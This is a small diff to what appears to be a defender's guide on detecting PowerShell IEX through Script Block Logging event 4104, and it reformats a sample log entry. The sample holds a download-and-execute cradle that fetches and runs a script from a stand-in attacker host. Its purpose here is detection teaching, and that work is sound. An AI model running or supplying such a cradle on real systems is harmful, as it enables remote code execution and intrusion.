@@ -99,15 +99,15 @@ This is the primary detection surface for IEX. When enabled, EID 4104 logs every
 
 **What a 4104 event shows for IEX:**
 
-EventID: 4104
+`EventID: 4104`
 
-ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
+`ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`
 
-Path:
+`Path:`
 
-MessageNumber: 1
+`MessageNumber: 1`
 
-MessageTotal: 1
+`MessageTotal: 1`
 
 If the downloaded payload is also executed via PowerShell, a second 4104 event fires for the payload content itself.
 
